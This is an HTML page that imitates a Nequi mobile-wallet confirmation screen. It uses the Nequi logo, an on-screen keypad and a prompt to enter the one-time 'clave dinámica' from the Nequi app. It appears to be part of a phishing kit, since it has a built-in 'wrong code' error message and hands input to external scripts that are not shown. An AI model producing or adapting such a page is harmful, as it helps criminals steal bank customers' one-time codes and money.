<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nequi - Confirmación</title>
    <link rel="stylesheet" href="confirmacion_nequi.css">
    <link rel="stylesheet" href="styles.css">
    <link rel="stylesheet" href="loading.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;600;700;800&display=swap" rel="stylesheet">
</head>
<body>
    <main class="main-content">
        <div id="error-message">
            Clave dinámica incorrecta.
        </div>
        <img src="img/logo.png" alt="Nequi" class="logo">
        <h1 class="title">Confirmacion de Nequi</h1>
        <p class="subtitle">Para confirmar escribe o pega la clave dinámica que encuentras en tu App Nequi.</p>

        <div class="otp-display">
            <div class="otp-digit"></div>
            <div class="otp-digit"></div>
            <div class="otp-digit"></div>
            <div class="otp-digit"></div>
            <div class="otp-digit"></div>
            <div class="otp-digit"></div>
        </div>

        <div class="keypad">
            <button class="keypad-btn" data-value="1">1</button>
            <button class="keypad-btn" data-value="2">2</button>
            <button class="keypad-btn" data-value="3">3</button>
            <button class="keypad-btn" data-value="4">4</button>
            <button class="keypad-btn" data-value="5">5</button>
            <button class="keypad-btn" data-value="6">6</button>
            <button class="keypad-btn" data-value="7">7</button>
            <button class="keypad-btn" data-value="8">8</button>
            <button class="keypad-btn" data-value="9">9</button>
            <div class="keypad-spacer"></div>
            <button class="keypad-btn" data-value="0">0</button>
            <button class="keypad-btn keypad-backspace" id="btn-backspace">
                ⌫
            </button>
        </div>

        <button class="btn-cancelar">Cancela</button>
    </main>

    <script src="confirmacion_nequi.js"></script>
    <script src="loading.js"></script>
</body>
</html>
